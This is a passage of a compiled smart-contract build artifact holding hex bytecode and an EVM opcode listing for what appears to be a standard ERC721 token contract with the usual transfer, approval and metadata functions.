111156115f6576115f5611ff5565b5b611601848285611e8f565b509392505050565b60008135905061161881612290565b92915050565b60008135905061162d816122a7565b92915050565b600081359050611642816122be565b92915050565b600081519050611657816122be565b92915050565b600082601f83011261167257611671611ff0565b5b81356116828482602086016115c7565b91505092915050565b60008135905061169a816122d5565b92915050565b6000602082840312156116b6576116b5611fff565b5b60006116c484828501611609565b91505092915050565b600080604083850312156116e4576116e3611fff565b5b60006116f285828601611609565b925050602061170385828601611609565b9150509250929050565b60008060006060848603121561172657611725611fff565b5b600061173486828701611609565b935050602061174586828701611609565b92505060406117568682870161168b565b9150509250925092565b6000806000806080858703121561177a57611779611fff565b5b600061178887828801611609565b945050602061179987828801611609565b93505060406117aa8782880161168b565b925050606085013567ffffffffffffffff8111156117cb576117ca611ffa565b5b6117d78782880161165d565b91505092959194509250565b600080604083850312156117fa576117f9611fff565b5b600061180885828601611609565b92505060206118198582860161161e565b9150509250929050565b6000806040838503121561183a57611839611fff565b5b600061184885828601611609565b92505060206118598582860161168b565b9150509250929050565b60006020828403121561187957611878611fff565b5b600061188784828501611633565b91505092915050565b6000602082840312156118a6576118a5611fff565b5b60006118b484828501611648565b91505092915050565b6000602082840312156118d3576118d2611fff565b5b60006118e18482850161168b565b91505092915050565b6118f381611e1b565b82525050565b61190281611e2d565b82525050565b600061191382611d4e565b61191d8185611d64565b935061192d818560208601611e9e565b61193681612004565b840191505092915050565b600061194c82611d59565b6119568185611d75565b9350611966818560208601611e9e565b61196f81612004565b840191505092915050565b600061198582611d59565b61198f8185611d86565b935061199f818560208601611e9e565b80840191505092915050565b60006119b8602d83611d75565b91506119c382612015565b604082019050919050565b60006119db603283611d75565b91506119e682612064565b604082019050919050565b60006119fe602583611d75565b9150611a09826120b3565b604082019050919050565b6000611a21602483611d75565b9150611a2c82612102565b604082019050919050565b6000611a44601983611d75565b9150611a4f82612151565b602082019050919050565b6000611a67602983611d75565b9150611a728261217a565b604082019050919050565b6000611a8a601883611d75565b9150611a95826121c9565b602082019050919050565b6000611aad602183611d75565b9150611ab8826121f2565b604082019050919050565b6000611ad0603d83611d75565b9150611adb82612241565b604082019050919050565b611aef81611e85565b82525050565b6000611b01828561197a565b9150611b0d828461197a565b91508190509392505050565b6000602082019050611b2e60008301846118ea565b92915050565b6000608082019050611b4960008301876118ea565b611b5660208301866118ea565b611b636040830185611ae6565b8181036060830152611b758184611908565b905095945050505050565b6000602082019050611b9560008301846118f9565b92915050565b60006020820190508181036000830152611bb58184611941565b905092915050565b60006020820190508181036000830152611bd6816119ab565b9050919050565b60006020820190508181036000830152611bf6816119ce565b9050919050565b60006020820190508181036000830152611c16816119f1565b9050919050565b60006020820190508181036000830152611c3681611a14565b9050919050565b60006020820190508181036000830152611c5681611a37565b9050919050565b60006020820190508181036000830152611c7681611a5a565b9050919050565b60006020820190508181036000830152611c9681611a7d565b9050919050565b60006020820190508181036000830152611cb681611aa0565b9050919050565b60006020820190508181036000830152611cd681611ac3565b9050919050565b6000602082019050611cf26000830184611ae6565b92915050565b6000611d02611d13565b9050611d0e8282611f03565b919050565b6000604051905090565b600067ffffffffffffffff821115611d3857611d37611fc1565b5b611d4182612004565b9050602081019050919050565b600081519050919050565b600081519050919050565b600082825260208201905092915050565b600082825260208201905092915050565b600081905092915050565b6000611d9c82611e85565b9150611da783611e85565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff03821115611ddc57611ddb611f34565b5b828201905092915050565b6000611df282611e85565b9150611dfd83611e85565b925082821015611e1057611e0f611f34565b5b828203905092915050565b6000611e2682611e65565b9050919050565b60008115159050919050565b60007fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b82818337600083830152505050565b60005b83811015611ebc578082015181840152602081019050611ea1565b83811115611ecb576000848401525b50505050565b60006002820490506001821680611ee957607f821691505b60208210811415611efd57611efc611f92565b5b50919050565b611f0c82612004565b810181811067ffffffffffffffff82111715611f2b57611f2a611fc1565b5b80604052505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b600080fd5b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4552433732313a2063616c6c6572206973206e6f7420746f6b656e206f776e6560008201527f72206f7220617070726f76656400000000000000000000000000000000000000602082015250565b7f4552433732313a207472616e7366657220746f206e6f6e20455243373231526560008201527f63656976657220696d706c656d656e7465720000000000000000000000000000602082015250565b7f4552433732313a207472616e736665722066726f6d20696e636f72726563742060008201527f6f776e6572000000000000000000000000000000000000000000000000000000602082015250565b7f4552433732313a207472616e7366657220746f20746865207a65726f2061646460008201527f7265737300000000000000000000000000000000000000000000000000000000602082015250565b7f4552433732313a20617070726f766520746f2063616c6c657200000000000000600082015250565b7f4552433732313a2061646472657373207a65726f206973206e6f74206120766160008201527f6c6964206f776e65720000000000000000000000000000000000000000000000602082015250565b7f4552433732313a20696e76616c696420746f6b656e2049440000000000000000600082015250565b7f4552433732313a20617070726f76616c20746f2063757272656e74206f776e6560008201527f7200000000000000000000000000000000000000000000000000000000000000602082015250565b7f4552433732313a20617070726f76652063616c6c6572206973206e6f7420746f60008201527f6b656e206f776e6572206f7220617070726f76656420666f7220616c6c000000602082015250565b61229981611e1b565b81146122a457600080fd5b50565b6122b081611e2d565b81146122bb57600080fd5b50565b6122c781611e39565b81146122d257600080fd5b50565b6122de81611e85565b81146122e957600080fd5b5056fea2646970667358221220d8ee7fada685f0b32f66df66d6451cea01150b5c19624f410f83018282edc5bb64736f6c63430008070033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xCF JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6352211E GT PUSH2 0x8C JUMPI DUP1 PUSH4 0xA22CB465 GT PUSH2 0x66 JUMPI DUP1 PUSH4 0xA22CB465 EQ PUSH2 0x224 JUMPI DUP1 PUSH4 0xB88D4FDE EQ PUSH2 0x240 JUMPI DUP1 PUSH4 0xC87B56DD EQ PUSH2 0x25C JUMPI DUP1 PUSH4 0xE985E9C5 EQ PUSH2 0x28C JUMPI PUSH2 0xCF JUMP JUMPDEST DUP1 PUSH4 0x6352211E EQ PUSH2 0x1A6 JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x1D6 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x206 JUMPI PUSH2 0xCF JUMP JUMPDEST DUP1 PUSH4 0x1FFC9A7 EQ PUSH2 0xD4 JUMPI DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x104 JUMPI DUP1 PUSH4 0x81812FC EQ PUSH2 0x122 JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x152 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x16E JUMPI DUP1 PUSH4 0x42842E0E EQ PUSH2 0x18A JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xEE PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0xE9 SWAP2 SWAP1 PUSH2 0x1863 JUMP JUMPDEST PUSH2 0x2BC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xFB SWAP2 SWAP1 PUSH2 0x1B80 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x10C PUSH2 0x39E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x119 SWAP2 SWAP1 PUSH2 0x1B9B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x13C PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x137 SWAP2 SWAP1 PUSH2 0x18BD JUMP JUMPDEST PUSH2 0x430 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x149 SWAP2 SWAP1 PUSH2 0x1B19 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x16C PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x167 SWAP2 SWAP1 PUSH2 0x1823 JUMP JUMPDEST PUSH2 0x476 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x188 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x183 SWAP2 SWAP1 PUSH2 0x170D JUMP JUMPDEST PUSH2 0x58E JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1A4 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x19F SWAP2 SWAP1 PUSH2 0x170D JUMP JUMPDEST PUSH2 0x5EE JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1C0 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x1BB SWAP2 SWAP1 PUSH2 0x18BD JUMP JUMPDEST PUSH2 0x60E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1CD SWAP2 SWAP1 PUSH2 0x1B19 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1F0 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x1EB SWAP2 SWAP1 PUSH2 0x16A0 JUMP JUMPDEST PUSH2 0x695 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1FD SWAP2 SWAP1 PUSH2 0x1CDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x20E PUSH2 0x74D JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x21B SWAP2 SWAP1 PUSH2 0x1B9B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x23E PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x239 SWAP2 SWAP1 PUSH2 0x17E3 JUMP JUMPDEST PUSH2 0x7DF JUMP JUMPDEST STOP JUMPDEST PUSH2 0x25A PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x255 SWAP2 SWAP1 PUSH2 0x1760 JUMP JUMPDEST PUSH2 0x7F5 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x276 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x271 SWAP2 SWAP1 PUSH2 0x18BD JUMP JUMPDEST PUSH2 0x857 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x283 SWAP2 SWAP1 PUSH2 0x1B9B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x2A6 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x2A1 SWAP2 SWAP1 PUSH2 0x16CD JUMP JUMPDEST PUSH2 0x8BF JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x2B3 SWAP2 SWAP1 PUSH2 0x1B80 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 PUSH32 0x80AC58CD00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP3 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND EQ DUP1 PUSH2 0x387 JUMPI POP PUSH32 0x5B5E139F00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP3 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND EQ JUMPDEST DUP1 PUSH2 0x397 JUMPI POP PUSH2 0x396 DUP3 PUSH2 0x953 JUMP JUMPDEST JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 SLOAD PUSH2 0x3AD SWAP1 PUSH2 0x1ED1 JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x3D9 SWAP1 PUSH2 0x1ED1 JUMP JUMPDEST DUP1 ISZERO PUSH2 0x426 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x3FB JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x426 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x409 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x43B DUP3 PUSH2 0x9BD JUMP JUMPDEST PUSH1 0x4 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x481 DUP3 PUSH2 0x60E JUMP JUMPDEST SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x4F2 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x4E9 SWAP1 PUSH2 0x1C9D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x511 PUSH2 0xA08 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ DUP1 PUSH2 0x540 JUMPI POP PUSH2 0x53F DUP2 PUSH2 0x53A PUSH2 0xA08 JUMP JUMPDEST PUSH2 0x8BF JUMP JUMPDEST JUMPDEST PUSH2 0x57F JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x576 SWAP1 PUSH2 0x1CBD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x589 DUP4 DUP4 PUSH2 0xA10 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH2 0x59F PUSH2 0x599 PUSH2 0xA08 JUMP JUMPDEST DUP3 PUSH2 0xAC9 JUMP JUMPDEST PUSH2 0x5DE JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x5D5 SWAP1 PUSH2 0x1BBD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x5E9 DUP4 DUP4 DUP4 PUSH2 0xB5E JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH2 0x609 DUP4 DUP4 DUP4 PUSH1 0x40 MLOAD DUP1 PUSH1 0x20 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x0 DUP2 MSTORE POP PUSH2 0x7F5 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x61A DUP4 PUSH2 0xE58 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x68C JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x683 SWAP1 PUSH2 0x1C7D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x706 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x6FD SWAP1 PUSH2 0x1C5D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x3 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x1 DUP1 SLOAD PUSH2 0x75C SWAP1 PUSH2 0x1ED1 JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x788 SWAP1 PUSH2 0x1ED1 JUMP JUMPDEST DUP1 ISZERO PUSH2 0x7D5 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x7AA JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x7D5 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x7B8 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH2 0x7F1 PUSH2 0x7EA PUSH2 0xA08 JUMP JUMPDEST DUP4 DUP4 PUSH2 0xE95 JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH2 0x806 PUSH2 0x800 PUSH2 0xA08 JUMP JUMPDEST DUP4 PUSH2 0xAC9 JUMP JUMPDEST PUSH2 0x845 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x83C SWAP1 PUSH2 0x1BBD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x851 DUP5 DUP5 DUP5 DUP5 PUSH2 0x1002 JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x60 PUSH2 0x862 DUP3 PUSH2 0x9BD JUMP JUMPDEST PUSH1 0x0 PUSH2 0x86C PUSH2 0x105E JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 MLOAD GT PUSH2 0x88C JUMPI PUSH1 0x40 MLOAD DUP1 PUSH1 0x20 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x0 DUP2 MSTORE POP PUSH2 0x8B7 JUMP JUMPDEST DUP1 PUSH2 0x896 DUP5 PUSH2 0x1075 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0x8A7 SWAP3 SWAP2 SWAP1 PUSH2 0x1AF5 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE JUMPDEST SWAP2 POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x5 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH32 0x1FFC9A700000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP3 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND EQ SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x9C6 DUP2 PUSH2 0x114D JUMP JUMPDEST PUSH2 0xA05 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x9FC SWAP1 PUSH2 0x1C7D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST DUP2 PUSH1 0x4 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0xA83 DUP4 PUSH2 0x60E JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG4 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0xAD5 DUP4 PUSH2 0x60E JUMP JUMPDEST SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ DUP1 PUSH2 0xB17 JUMPI POP PUSH2 0xB16 DUP2 DUP6 PUSH2 0x8BF JUMP JUMPDEST JUMPDEST DUP1 PUSH2 0xB55 JUMPI POP DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0xB3D DUP5 PUSH2 0x430 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0xB7E DUP3 PUSH2 0x60E JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0xBD4 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xBCB SWAP1 PUSH2 0x1BFD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xC44 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xC3B SWAP1 PUSH2 0x1C1D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0xC51 DUP4 DUP4 DUP4 PUSH1 0x1 PUSH2 0x118E JUMP JUMPDEST DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0xC71 DUP3 PUSH2 0x60E JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0xCC7 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xCBE SWAP1 PUSH2 0x1BFD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x4 PUSH1 0x0 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD SWAP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 SSTORE PUSH1 0x1 PUSH1 0x3 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD SUB SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH1 0x1 PUSH1 0x3 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP DUP2 PUSH1 0x2 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 